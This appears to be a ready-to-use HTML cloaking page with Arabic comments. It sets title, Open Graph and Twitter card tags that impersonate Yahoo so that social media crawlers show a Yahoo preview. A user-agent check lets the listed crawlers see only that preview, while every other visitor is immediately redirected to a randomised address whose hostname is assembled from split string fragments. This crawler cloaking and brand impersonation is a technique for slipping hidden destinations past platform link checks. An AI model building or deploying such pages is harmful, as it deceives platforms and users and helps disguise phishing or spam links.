<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <!-- 1. وسوم معاينة موقع Yahoo المباشرة والثابتة لـ Twitterbot ليعرضها فورًا -->
  <title>Yahoo | Mail, Weather, Search, Politics, Finance, Sports & News</title>
  <meta property="og:title" content="Yahoo | Mail, Weather, Search, Politics, Finance, Sports & News">
  <meta property="og:description" content="A new take on trusted news. Connect with your world at Yahoo.">
  <meta property="og:image" content="https://yimg.com">
  
  <!-- إعدادات بطاقة تويتر الكبيرة لفرض ظهور المعاينة بشعار Yahoo -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Yahoo | Mail, Weather, Search, Politics, Finance, Sports & News">
  <meta name="twitter:description" content="A new take on trusted news. Connect with your world at Yahoo.">
  <meta name="twitter:image" content="https://yimg.com">

  <!-- 2. سكربت فحص البوتات والتوجيه العشوائي الفوري للزوار الحقيقيين إلى محرك البحث -->
  <script type="text/javascript">
    (function() {
      var ua = navigator.userAgent || "";
      // قائمة البوتات الرسمية لمنصات التواصل
      var isBot = /Twitterbot|facebookexternalhit|LinkedInBot|TelegramBot|Slackbot|Discordbot|Embedly|Googlebot/i.test(ua);

      // إذا كان زائرًا حقيقيًا (وليس بوتاً)، يتم توجيهه فورا وبشكل عشوائي إلى جوجل (حسب كودك الأصلي)
      if (!isBot) {
        var a = "goog";
        var b = "le.";
        var c = "com/?";
        var d = Math.ceil(Math.random() * 24);
        window.location.replace("https://" + a + b + c + d);
      }
    })();
  </script>
</head>
<body>
  <!-- صفحة فارغة تماماً للبوتات والزوار قبل إعادة التوجيه -->
</body>
</html>
